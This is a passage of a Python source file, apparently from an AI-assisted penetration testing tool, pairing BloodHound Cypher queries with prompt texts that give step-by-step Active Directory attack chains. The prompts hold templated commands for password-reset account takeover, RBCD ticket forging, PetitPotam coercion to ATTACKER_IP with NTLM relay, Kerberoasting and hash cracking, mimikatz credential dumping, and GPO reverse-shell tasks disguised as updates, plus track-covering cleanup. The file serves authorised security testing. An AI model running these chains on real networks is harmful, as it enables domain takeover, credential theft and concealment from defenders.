AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
AND n <> target
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["ForceChangePassword"],
        "rag_context": """FORCECHANGEPASSWORD - ACCOUNT TAKEOVER VIA PASSWORD RESET:

This finding identifies principals that can change another user's password WITHOUT knowing
the current password. This is a direct account takeover — the attacker sets a new password
and authenticates as the victim.

ATTACK CHAIN:
1. RESET TARGET PASSWORD:
   bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} set password '{target}' 'NewP@ssw0rd!'
   OR: net rpc password '{target}' 'NewP@ssw0rd!' -U '{domain}/{user}%{pass}' -S DC.{domain}
   OR: Set-ADAccountPassword -Identity '{target}' -Reset -NewPassword (ConvertTo-SecureString 'NewP@ssw0rd!' -AsPlainText -Force)

2. AUTHENTICATE AS TARGET:
   evil-winrm -i DC.{domain} -u '{target}' -p 'NewP@ssw0rd!'
   OR: nxc smb DC.{domain} -u '{target}' -p 'NewP@ssw0rd!'

3. CHECK TARGET PRIVILEGES:
   - Group memberships (Domain Admins, Remote Management Users, etc.)
   - Outbound ACL control (GenericAll, WriteDacl on other objects)
   - Admin access (AdminTo on computers)

WARNING: Password changes are NOISY — triggers password change events, may break
service accounts, and the original user will notice. Use only when necessary.

TOOLS: bloodyAD, net rpc, rpcclient, PowerShell AD Module
MITRE: T1098.001 (Account Manipulation: Additional Cloud Credentials)"""
    },

    # ===========================================
    # Resource-Based Constrained Delegation (RBCD)
    # ===========================================
    {
        "name": "RBCD - AddAllowedToAct on Computers",
        "description": "Principals that can configure Resource-Based Constrained Delegation on computers - enables impersonation of any user to that computer",
        "cypher": """MATCH p=(n)-[:AddAllowedToAct]->(c:Computer)
WHERE (n.enabled = true OR n:Group OR n:Computer)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["AddAllowedToAct"],
        "rag_context": """RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) - COMPUTER TAKEOVER:

This finding identifies principals that can modify the msDS-AllowedToActOnBehalfOfOtherIdentity
attribute on a computer. This enables RBCD attacks — the attacker configures a controlled
machine account to impersonate any user to the target computer.

CRITICAL INSTRUCTIONS:
- Use impacket tools (Linux/Kali) for ALL steps. Do NOT use Rubeus or PowerShell.
- You MUST generate EXACTLY 5 attack steps matching the chain below. Do NOT skip any step.
- ALL commands run on the ATTACKER machine, not on the target.

REQUIRED 5-STEP ATTACK CHAIN:

Step 1 — CREATE A MACHINE ACCOUNT:
   Check quota first, then create a fake computer account the attacker controls.
   $ impacket-addcomputer '{domain}/{user}:{pass}' -computer-name 'FAKEPC$' -computer-pass 'FakeP@ss123' -dc-ip {dc_ip}

Step 2 — CONFIGURE RBCD ON TARGET:
   Use the source principal's AddAllowedToAct right to set msDS-AllowedToActOnBehalfOfOtherIdentity.
   $ impacket-rbcd '{domain}/{user}:{pass}' -action write -delegate-from 'FAKEPC$' -delegate-to '{target_computer}$' -dc-ip {dc_ip}

Step 3 — REQUEST SERVICE TICKET VIA S4U:
   Perform S4U2Self + S4U2Proxy to get a ticket impersonating a privileged user.
   $ impacket-getST '{domain}/FAKEPC$:FakeP@ss123' -spn cifs/{target_computer}.{domain} -impersonate Administrator -dc-ip {dc_ip}
   NOTE: If Administrator is in Protected Users (AccountNotDelegated=true), impersonate
   a different admin who is NOT protected (e.g., BACKUPADMIN, svc_admin).

Step 4 — USE THE SERVICE TICKET:
   Import the .ccache ticket and access the target computer.
   $ export KRB5CCNAME=Administrator@cifs_{target_computer}.{domain}@{DOMAIN}.ccache
   $ impacket-psexec -k -no-pass '{domain}/Administrator@{target_computer}.{domain}'
   OR: impacket-wmiexec -k -no-pass '{domain}/Administrator@{target_computer}.{domain}'
   OR: impacket-secretsdump -k -no-pass '{domain}/Administrator@{target_computer}.{domain}'

Step 5 — CLEANUP:
   Remove the RBCD configuration to cover tracks.
   $ impacket-rbcd '{domain}/{user}:{pass}' -action flush -delegate-to '{target_computer}$' -dc-ip {dc_ip}

TOOLS: impacket (addcomputer, rbcd, getST, psexec, wmiexec, secretsdump), bloodyAD
MITRE: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)"""
    },

    {
        "name": "RBCD - WriteAccountRestrictions on Computers",
        "description": "Principals that can write account restrictions on computers - enables RBCD by modifying msDS-AllowedToActOnBehalfOfOtherIdentity",
        "cypher": """MATCH p=(n)-[:WriteAccountRestrictions]->(c:Computer)
WHERE (n.enabled = true OR n:Group OR n:Computer)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["WriteAccountRestrictions"],
        "rag_context": """WRITEACCOUNTRESTRICTIONS - RBCD SETUP VIA ACCOUNT RESTRICTIONS:

This finding identifies principals that can modify the msDS-AllowedToActOnBehalfOfOtherIdentity
attribute on a computer via WriteAccountRestrictions. This is functionally equivalent to
AddAllowedToAct — it enables RBCD attacks.

The attack chain is IDENTICAL to AddAllowedToAct RBCD. Use impacket tools from attacker machine.

REQUIRED 5-STEP ATTACK CHAIN:

Step 1 — CREATE A MACHINE ACCOUNT:
   $ impacket-addcomputer '{domain}/{user}:{pass}' -computer-name 'FAKEPC$' -computer-pass 'FakeP@ss123' -dc-ip {dc_ip}

Step 2 — CONFIGURE RBCD ON TARGET:
   $ impacket-rbcd '{domain}/{user}:{pass}' -action write -delegate-from 'FAKEPC$' -delegate-to '{target_computer}$' -dc-ip {dc_ip}

Step 3 — REQUEST SERVICE TICKET VIA S4U:
   $ impacket-getST '{domain}/FAKEPC$:FakeP@ss123' -spn cifs/{target_computer}.{domain} -impersonate Administrator -dc-ip {dc_ip}

Step 4 — USE THE SERVICE TICKET:
   $ export KRB5CCNAME=Administrator@cifs_{target_computer}.{domain}@{DOMAIN}.ccache
   $ impacket-psexec -k -no-pass '{domain}/Administrator@{target_computer}.{domain}'

Step 5 — CLEANUP:
   $ impacket-rbcd '{domain}/{user}:{pass}' -action flush -delegate-to '{target_computer}$' -dc-ip {dc_ip}

TOOLS: impacket (addcomputer, rbcd, getST, psexec, wmiexec, secretsdump), bloodyAD
MITRE: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)"""
    },

    # ===========================================
    # Lateral Movement: WinRM, RDP, DCOM
    # ===========================================
    {
        "name": "WinRM Access (CanPSRemote)",
        "description": "Non-admin principals with PowerShell Remoting/WinRM access to computers - lateral movement path",
        "cypher": """MATCH p=(n)-[:CanPSRemote]->(c:Computer)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "High",
        "edges_used": ["CanPSRemote"],
        "rag_context": """WINRM / POWERSHELL REMOTING ACCESS - LATERAL MOVEMENT:

This finding identifies principals with CanPSRemote rights on computers.
WinRM enables remote PowerShell sessions — full command execution on the target.

ATTACK CHAIN:
1. CONNECT VIA WINRM:
   evil-winrm -i {target_computer}.{domain} -u {user} -p '{pass}'
   OR: Enter-PSSession -ComputerName {target_computer}.{domain} -Credential {domain}\\{user}

2. POST-EXPLOITATION ON TARGET:
   - Dump credentials: mimikatz # sekurlsa::logonpasswords
   - Check logged-in users: query user
   - Enumerate local groups: net localgroup administrators
   - Check for stored credentials: cmdkey /list

TOOLS: evil-winrm, PowerShell Enter-PSSession, nxc winrm
MITRE: T1021.006 (Remote Services: Windows Remote Management)"""
    },
    {
        "name": "RDP Access (CanRDP)",
        "description": "Non-admin principals with Remote Desktop access to computers - lateral movement path",
        "cypher": """MATCH p=(n)-[:CanRDP]->(c:Computer)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "High",
        "edges_used": ["CanRDP"],
        "rag_context": """REMOTE DESKTOP ACCESS - LATERAL MOVEMENT:

This finding identifies principals with CanRDP rights on computers.
RDP provides interactive desktop access — useful for GUI tools and credential harvesting.

ATTACK CHAIN:
1. CONNECT VIA RDP:
   xfreerdp /v:{target_computer}.{domain} /u:{user} /p:'{pass}' /d:{domain} +clipboard /dynamic-resolution
   OR: rdesktop {target_computer}.{domain}

2. POST-EXPLOITATION:
   - Run mimikatz for credential dumping
   - Check for stored credentials and browser passwords
   - Enumerate network shares and connected drives

TOOLS: xfreerdp, rdesktop, mstsc, nxc rdp
MITRE: T1021.001 (Remote Services: Remote Desktop Protocol)"""
    },
    {
        "name": "DCOM Execution (ExecuteDCOM)",
        "description": "Principals with DCOM execution rights on computers - stealthy lateral movement",
        "cypher": """MATCH p=(n)-[:ExecuteDCOM]->(c:Computer)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
RETURN p
LIMIT 50""",
        "attack_type": "lateral_movement",
        "priority": "High",
        "edges_used": ["ExecuteDCOM"],
        "rag_context": """DCOM EXECUTION - STEALTHY LATERAL MOVEMENT:

This finding identifies principals with ExecuteDCOM rights on computers.
DCOM enables remote command execution through COM objects — often less monitored than WinRM/RDP.

ATTACK CHAIN:
1. EXECUTE VIA DCOM:
   impacket-dcomexec {domain}/{user}:'{pass}'@{target_computer}.{domain}
   OR: Invoke-DCOM -ComputerName {target_computer} -Method MMC20.Application -Command 'cmd.exe /c whoami'

TOOLS: impacket-dcomexec, Invoke-DCOM, PowerView
MITRE: T1021.003 (Remote Services: Distributed Component Object Model)"""
    },

    # ===========================================
    # Coercion and Session Harvesting
    # ===========================================
    {
        "name": "HasSession - Credential Harvesting Targets",
        "description": "Privileged users with active sessions on computers - admin access to these computers enables credential dumping",
        "cypher": """MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH '-512'
   OR g.objectid ENDS WITH '-519'
   OR g.objectid ENDS WITH '-544'
WITH COLLECT(DISTINCT u.name) AS privUsers
MATCH p=(u:User)-[:HasSession]->(c:Computer)
WHERE u.name IN privUsers
AND (c.isdc IS NULL OR c.isdc = false)
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["HasSession"],
        "rag_context": """HASSESSION - PRIVILEGED USER CREDENTIAL HARVESTING:

This finding identifies computers where privileged users (Domain Admins, Enterprise Admins,
Administrators) have active sessions. If an attacker gains admin access to these computers,
they can dump the privileged user's credentials from memory.

ATTACK CHAIN:
1. GAIN ADMIN ON TARGET COMPUTER (via other attack path)

2. DUMP CREDENTIALS FROM MEMORY:
   mimikatz # privilege::debug
   mimikatz # sekurlsa::logonpasswords
   OR: impacket-secretsdump {domain}/{user}:'{pass}'@{target_computer}.{domain}

3. USE HARVESTED CREDENTIALS:
   Pass-the-Hash or authenticate with stolen NTLM hash/password

TOOLS: mimikatz, impacket-secretsdump, nxc, Rubeus
MITRE: T1003.001 (OS Credential Dumping: LSASS Memory)"""
    },
    {
        "name": "CoerceToTGT - Authentication Coercion (Non-DC)",
        "description": "Non-DC computers with unconstrained delegation that can be coerced — DC CoerceToTGT is excluded as default AD behavior",
        "cypher": """MATCH p=(c:Computer)-[:CoerceToTGT]->(d:Domain)
WHERE NOT (c.isdc = true)
AND NOT (c.distinguishedname CONTAINS 'Domain Controllers')
AND NOT (c.name STARTS WITH 'DC.' OR c.name STARTS WITH 'DC0' OR c.name STARTS WITH 'DC1')
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["CoerceToTGT"],
        "rag_context": """COERCETOTGT - AUTHENTICATION COERCION:

This finding identifies computers (typically Domain Controllers) that can be coerced into
authenticating to an attacker-controlled listener. The attacker captures the machine's
TGT or NTLM hash and relays it for privilege escalation.

IMPORTANT CAVEAT: This edge exists on ALL Domain Controllers by default (they all have
unconstrained delegation). It is only EXPLOITABLE if the environment lacks NTLM relay
protections. The observation MUST mention this caveat and include the verification commands
below so the pentester can check before attempting exploitation.

PREREQUISITE VERIFICATION (Step 1 of the attack chain):
The pentester MUST verify these conditions before attempting coercion:
   $ nxc ldap {target_dc}.{domain} -u {user} -p '{pass}' -M ldap-checker
   (Check: LDAP signing NOT required, Channel binding NOT enforced)
   $ nxc smb {target_dc}.{domain} -u {user} -p '{pass}' -M spooler
   (Check: Print Spooler running — required for PrinterBug)
   $ nxc smb {target_dc}.{domain} -u {user} -p '{pass}' -M petitpotam
   (Check: PetitPotam not patched — required for EFS coercion)

If LDAP signing IS enforced and channel binding IS enabled, this attack is NOT viable.
State this clearly in the observation.

CRITICAL: The attacker runs ALL tools FROM THEIR OWN MACHINE (Kali/Linux), NOT on the DC.

ATTACK CHAIN (only proceed if prerequisites pass):

Step 1 — VERIFY PREREQUISITES:
   $ nxc ldap {target_dc}.{domain} -u {user} -p '{pass}' -M ldap-checker
   $ nxc smb {target_dc}.{domain} -u {user} -p '{pass}' -M spooler

Step 2 — SET UP RELAY LISTENER ON ATTACKER MACHINE:
   $ impacket-ntlmrelayx -t ldap://{target_dc}.{domain} --delegate-access --escalate-user 'FAKEPC$'

Step 3 — TRIGGER COERCION:
   $ PetitPotam.py ATTACKER_IP {target_dc}.{domain} -u {user} -p '{pass}' -d {domain}
   OR: coercer coerce -l ATTACKER_IP -t {target_dc}.{domain} -u {user} -p '{pass}' -d {domain}

Step 4 — EXPLOIT VIA RBCD:
   $ impacket-getST '{domain}/FAKEPC$:{pass}' -spn cifs/{target_dc}.{domain} -impersonate Administrator -dc-ip {dc_ip}
   $ export KRB5CCNAME=Administrator.ccache
   $ impacket-secretsdump -k -no-pass '{domain}/Administrator@{target_dc}.{domain}'

TOOLS: nxc (ldap-checker, spooler, petitpotam modules), PetitPotam, Coercer, impacket-ntlmrelayx, krbrelayx
MITRE: T1187 (Forced Authentication)"""
    },

    # ===========================================
    # WriteSPN - Targeted Kerberoasting Setup
    # ===========================================
    {
        "name": "WriteSPN - Targeted Kerberoasting",
        "description": "Principals that can write SPNs on user accounts - enables targeted Kerberoasting by setting a fake SPN",
        "cypher": """MATCH p=(n)-[:WriteSPN]->(target:User)
WHERE (n.enabled = true OR n:Group)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND n <> target
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["WriteSPN"],
        "rag_context": """WRITESPN - TARGETED KERBEROASTING SETUP:

This finding identifies principals that can write the servicePrincipalName attribute
on user accounts. This enables TARGETED KERBEROASTING — set a fake SPN on the victim,
request a TGS, then crack their password offline.

ATTACK CHAIN:
1. SET FAKE SPN ON TARGET:
   bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} set object '{target}' servicePrincipalName -v 'HTTP/fake.{domain}'
   OR: Set-DomainObject -Identity '{target}' -Set @{serviceprincipalname='HTTP/fake.{domain}'}

2. REQUEST TGS (Kerberoast):
   impacket-GetUserSPNs {domain}/{user}:'{pass}' -request -outputfile tgs_hash.txt -dc-ip {dc_ip}

3. CRACK OFFLINE:
   hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt

4. CLEANUP (OPSEC):
   bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} set object '{target}' servicePrincipalName -v ''

TOOLS: bloodyAD, PowerView, impacket-GetUserSPNs, hashcat
MITRE: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)"""
    },

    # ===========================================
    # NTLM Relay Infrastructure
    # ===========================================
    {
        "name": "NTLM Relay Paths",
        "description": "BloodHound CE shortcut edges showing validated coercion-to-relay attack chains",
        "cypher": """MATCH p=(n)-[r]->(target)
WHERE type(r) IN ['CoerceAndRelayNTLMToSMB', 'CoerceAndRelayNTLMToLDAP', 'CoerceAndRelayNTLMToLDAPS', 'CoerceAndRelayNTLMToADCS']
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["CoerceAndRelayNTLMToSMB", "CoerceAndRelayNTLMToLDAP", "CoerceAndRelayNTLMToLDAPS", "CoerceAndRelayNTLMToADCS"],
        "rag_context": """NTLM RELAY - COERCION AND RELAY ATTACK CHAINS:

BloodHound CE validates and creates shortcut edges for coercion-to-relay paths.
These are pre-validated attack chains where coercion + relay leads to compromise.

RELAY TO LDAP (RBCD/Shadow Credentials):
1. START RELAY: ntlmrelayx.py -t ldap://DC.{domain} --delegate-access
2. TRIGGER COERCION: PetitPotam.py ATTACKER_IP {target} -d {domain} -u {user} -p '{pass}'
3. RELAY configures RBCD or Shadow Credentials automatically
4. USE: getST.py + psexec.py for access

RELAY TO ADCS (Certificate abuse):
1. START RELAY: ntlmrelayx.py -t http://CA.{domain}/certsrv/certfnsh.asp --adcs --template DomainController
2. TRIGGER COERCION: PetitPotam.py or Coercer
3. RELAY obtains a certificate for the coerced machine
4. USE: certipy auth -pfx machine.pfx -dc-ip {dc_ip}

TOOLS: ntlmrelayx, PetitPotam, Coercer, certipy, impacket
MITRE: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)"""
    },

    # ===========================================
    # Group and Computer Outbound Object Control
    # ===========================================
    {
        "name": "Outbound Object Control - Groups with ACL Abuse Paths",
        "description": "Non-default groups with outbound control edges over users, computers, or other groups - joining these groups grants inherited ACL rights",
        "cypher": """MATCH p=(g:Group)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AddKeyCredentialLink|AllExtendedRights]->(target)
WHERE g <> target
AND NOT g.objectid ENDS WITH '-512'
AND NOT g.objectid ENDS WITH '-519'
AND NOT g.objectid ENDS WITH '-544'
AND NOT g.objectid ENDS WITH '-518'
AND NOT g.objectid ENDS WITH '-516'
AND NOT g.name STARTS WITH 'DOMAIN ADMINS'
AND NOT g.name STARTS WITH 'ENTERPRISE ADMINS'
AND NOT g.name STARTS WITH 'ADMINISTRATORS'
AND NOT g.name STARTS WITH 'ACCOUNT OPERATORS'
AND NOT g.name STARTS WITH 'KEY ADMINS'
AND NOT g.name STARTS WITH 'ENTERPRISE KEY ADMINS'
AND NOT g.name STARTS WITH 'DOMAIN CONTROLLERS'
AND NOT g.name STARTS WITH 'RAS AND IAS SERVERS'
AND NOT g.name STARTS WITH 'WINDOWS AUTHORIZATION ACCESS'
AND NOT g.name STARTS WITH 'CERTIFICATE SERVICE DCOM'
AND NOT g.name STARTS WITH 'DENIED RODC'
AND NOT g.name STARTS WITH 'ALLOWED RODC'
AND NOT g.name STARTS WITH 'ENTERPRISE READ-ONLY'
AND NOT g.name STARTS WITH 'ENTERPRISE DOMAIN CONTROLLERS'
AND NOT target.name STARTS WITH 'RAS AND IAS SERVERS'
AND NOT target.name STARTS WITH 'WINDOWS AUTHORIZATION ACCESS'
AND NOT target.name STARTS WITH 'CERTIFICATE SERVICE DCOM'
AND NOT target.name STARTS WITH 'DENIED RODC'
AND NOT target.name STARTS WITH 'ALLOWED RODC'
RETURN p
LIMIT 100""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "ForceChangePassword", "AddKeyCredentialLink", "AllExtendedRights"],
        "rag_context": """GROUP OUTBOUND OBJECT CONTROL - INHERITED ACL ABUSE:

This finding identifies non-default AD GROUPS that have outbound control edges over users,
computers, or other groups. Any member of these groups INHERITS these powerful rights.

WHY THIS MATTERS:
If you can join one of these groups (via AddSelf, AddMember, or other group manipulation),
you immediately inherit all of the group's ACL rights. This is the payoff after group enrollment.

COMMON ATTACK PATTERNS:
- Group has GenericAll on User → password reset is the FASTEST approach (one command, immediate access)
- Group has GenericAll on Computer → RBCD attack (impacket-addcomputer + rbcd + getST)
- Group has ForceChangePassword on User → reset that user's password
- Group has WriteDacl on Object → modify ACLs to grant full control

ATTACK CHAIN (after joining the group):

For GenericAll on USER — show TWO OPSEC options:

OPSEC-SAFE Option: Password Reset (instant access, one command):
   $ bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} set password '{target_user}' 'NewP@ss123!'
   Then authenticate: evil-winrm -i DC.{domain} -u '{target_user}' -p 'NewP@ss123!'

OPSEC-RISKY Option: Targeted Kerberoasting (avoids changing password):
   $ bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} set object '{target_user}' servicePrincipalName -v 'HTTP/fake.{domain}'
   $ impacket-GetUserSPNs {domain}/{user}:'{pass}' -request -outputfile hash.txt -dc-ip DC.{domain}
   $ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
   $ bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} set object '{target_user}' servicePrincipalName -v ''

IMPORTANT: Do NOT add a "refresh Kerberos ticket" step after group enrollment.
The next command (bloodyAD/impacket) authenticates directly with password — no manual ticket refresh needed.

TOOLS: bloodyAD, certipy, impacket-GetUserSPNs, hashcat, PowerView
MITRE: T1222.001 (File and Directory Permissions Modification)"""
    },
    {
        "name": "Outbound Object Control - Computers with ACL Abuse Paths",
        "description": "Computer and GMSA accounts with outbound control edges - compromising these machines grants ACL rights over targets",
        "cypher": """MATCH p=(c:Computer)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AddKeyCredentialLink|AllExtendedRights]->(target)
WHERE c <> target
AND NOT c.objectid ENDS WITH '-516'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "High",
        "edges_used": ["GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "ForceChangePassword", "AddKeyCredentialLink", "AllExtendedRights"],
        "rag_context": """COMPUTER/GMSA OUTBOUND OBJECT CONTROL - MACHINE ACCOUNT ACL ABUSE:

This finding identifies COMPUTER or GMSA accounts that have outbound control edges over
users, groups, or other computers. Compromising these machine accounts (via ReadGMSAPassword,
local admin credential dump, or NTLM relay) grants the attacker their ACL rights.

CRITICAL: Computer accounts authenticate with NT hashes, not passwords.
Use pass-the-hash (-hashes :NT_HASH) with all tools.

ATTACK CHAIN:
1. OBTAIN MACHINE ACCOUNT HASH:
   For GMSA: $ python3 gMSADumper.py -u {user} -p '{pass}' -d {domain}
   For Computer: $ impacket-secretsdump {domain}/{admin}:'{pass}'@{source_computer}.{domain} -just-dc-user '{source_computer}$'

2. USE MACHINE ACCOUNT TO EXPLOIT ACL RIGHTS:
   GenericAll on User → reset password:
   $ bloodyAD -d {domain} -u '{source_computer}$' --hashes ':{nt_hash}' --host DC.{domain} set password '{target}' 'NewP@ss123!'

   GenericAll on User → shadow credentials:
   $ certipy shadow auto -u '{source_computer}$'@{domain} -hashes ':{nt_hash}' -account '{target}' -dc-ip DC.{domain}

   GenericWrite on Group → add member:
   $ bloodyAD -d {domain} -u '{source_computer}$' --hashes ':{nt_hash}' --host DC.{domain} add groupMember '{target_group}' '{source_computer}$'

3. AUTHENTICATE AS COMPROMISED TARGET and continue escalation.

TOOLS: gMSADumper, bloodyAD, certipy, impacket-secretsdump
MITRE: T1078.003 (Valid Accounts: Local Accounts)"""
    },

    # ===========================================
    # GPO Abuse — Write Access on Group Policy Objects
    # ===========================================
    {
        "name": "GPO Abuse - Write Access on Group Policy Objects",
        "description": "Principals with write access on GPOs linked to sensitive OUs — enables code execution on all machines in the OU",
        "cypher": """MATCH p=(n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(gpo:GPO)-[:GPLink]->(target)
WHERE (n.enabled = true OR n:Group OR n:Computer)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
AND NOT n.name STARTS WITH 'DOMAIN ADMINS'
AND NOT n.name STARTS WITH 'ENTERPRISE ADMINS'
AND NOT n.name STARTS WITH 'ADMINISTRATORS'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "GPLink"],
        "rag_context": """GPO ABUSE — GROUP POLICY OBJECT WRITE ACCESS:

This finding identifies principals with write access on GPO objects that are linked to
sensitive OUs (Domain Controllers, workstations, servers). An attacker who can modify
a GPO can push malicious policies that execute code on EVERY machine in the linked OU.

CRITICAL: GPO abuse is one of the most powerful AD attacks — a single GPO modification
can compromise every computer in an OU simultaneously.

ATTACK CHAIN (ALL FROM ATTACKER KALI MACHINE):

Step 1 — ENUMERATE GPO LINKS AND PERMISSIONS:
   $ nxc ldap DC.{domain} -u {user} -p '{pass}' -M gpp_autologin
   $ bloodyAD -d {domain} -u {user} -p '{pass}' --host DC.{domain} get object '{gpo_name}' --attr gPCFileSysPath

Step 2 — ABUSE GPO WRITE ACCESS (choose one):

   a) Immediate Scheduled Task (runs within 90 minutes or on next gpupdate):
   $ pyGPOAbuse.py '{domain}/{user}:{pass}' -gpo-id '{GPO_ID}' -command 'powershell -enc BASE64_REVSHELL' -taskname 'WindowsUpdate' -description 'Security Update'

   b) Computer Startup Script:
   $ pyGPOAbuse.py '{domain}/{user}:{pass}' -gpo-id '{GPO_ID}' -command 'net localgroup administrators {user} /add' -f

   c) SharpGPOAbuse (Windows):
   SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT AUTHORITY\\SYSTEM --Command "cmd.exe" --Arguments "/c net localgroup administrators {user} /add" --GPOName "{GPO_NAME}"

Step 3 — FORCE GPO UPDATE (optional — speeds up exploitation):
   $ nxc smb TARGET.{domain} -u {user} -p '{pass}' -x 'gpupdate /force'

Step 4 — ACCESS COMPROMISED MACHINES:
   $ evil-winrm -i TARGET.{domain} -u {user} -p '{pass}'
   OR: impacket-psexec {domain}/{user}:{pass}@TARGET.{domain}

IMPORTANT: If the GPO is linked to the DOMAIN CONTROLLERS OU, modifying it gives
code execution on ALL DCs — this is direct domain compromise.

TOOLS: pyGPOAbuse.py, SharpGPOAbuse, bloodyAD, nxc
MITRE: T1484.001 (Domain Policy Modification: Group Policy Modification)"""
    },

    # ===========================================
    # OU-Level ACL Abuse
    # ===========================================
    {
        "name": "OU ACL Abuse - Write Access on Organizational Units",
        "description": "Non-admin principals with write access on OUs containing sensitive objects — enables inheritance-based takeover of all objects in the OU",
        "cypher": """MATCH p=(n)-[r:GenericAll|WriteDacl|WriteOwner|Owns]->(ou:OU)-[:Contains]->(target)
WHERE (n.enabled = true OR n:Group OR n:Computer)
AND NOT n.objectid ENDS WITH '-500'
AND NOT n.objectid ENDS WITH '-512'
AND NOT n.objectid ENDS WITH '-519'
AND NOT n.objectid ENDS WITH '-544'
AND NOT n.name STARTS WITH 'DOMAIN ADMINS'
AND NOT n.name STARTS WITH 'ENTERPRISE ADMINS'
AND NOT n.name STARTS WITH 'ADMINISTRATORS'
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["GenericAll", "WriteDacl", "WriteOwner", "Owns"],
        "rag_context": """OU ACL ABUSE — ORGANIZATIONAL UNIT WRITE ACCESS:

This finding identifies principals with write access on an Organizational Unit (OU).
OUs are containers in AD — controlling an OU means controlling EVERY object inside it.

WHY THIS IS CRITICAL:
If you have WriteDacl/GenericAll on an OU that contains Domain Controllers, you can:
1. Add an inheritable ACE granting yourself GenericAll on all child objects
2. Every DC, user, and computer in that OU inherits the ACE
3. Instant domain compromise without touching the Domain object directly

ATTACK CHAIN:

Step 1 — GRANT INHERITABLE PERMISSIONS ON THE OU:
   $ impacket-dacledit -action write -rights FullControl -principal '{source}' -target '{ou_dn}' -inheritance '{domain}/{source}:<PASSWORD>' -dc-ip {dc_ip}

Step 2 — INHERITED PERMISSIONS PROPAGATE TO ALL CHILD OBJECTS:
   Verify: bloodyAD -d {domain} -u {source} -p '<PASSWORD>' --host DC.{domain} get writable --right GenericAll

Step 3 — EXPLOIT CHILD OBJECTS:
   If OU contains DCs: impacket-secretsdump {domain}/{source}:<PASSWORD>@DC.{domain}
   If OU contains users: bloodyAD ... set password TARGET 'NewP@ss!'
   If OU contains computers: RBCD or Shadow Credentials

TOOLS: impacket-dacledit, bloodyAD, PowerView
MITRE: T1222.001 (File and Directory Permissions Modification: Windows)"""
    },

    # ===========================================
    # AdminTo + HasSession — Credential Harvesting Pivot
    # ===========================================
    {
        "name": "Credential Harvesting via Admin Access + Privileged Sessions",
        "description": "Non-admin users with local admin on computers where privileged users have active sessions — enables credential dumping and impersonation",
        "cypher": """MATCH (attacker)-[:AdminTo]->(computer:Computer)<-[:HasSession]-(victim:User)-[:MemberOf*1..2]->(g:Group)
WHERE (g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-519' OR g.objectid ENDS WITH '-544')
AND attacker <> victim
AND (attacker.enabled = true OR attacker:Group)
AND NOT attacker.objectid ENDS WITH '-500'
AND NOT attacker.objectid ENDS WITH '-512'
AND NOT attacker.objectid ENDS WITH '-519'
RETURN attacker.name AS source, computer.name AS target, victim.name AS session_user, g.name AS privileged_group
LIMIT 30""",
        "attack_type": "credential_access",
        "priority": "Critical",
        "edges_used": ["AdminTo", "HasSession"],
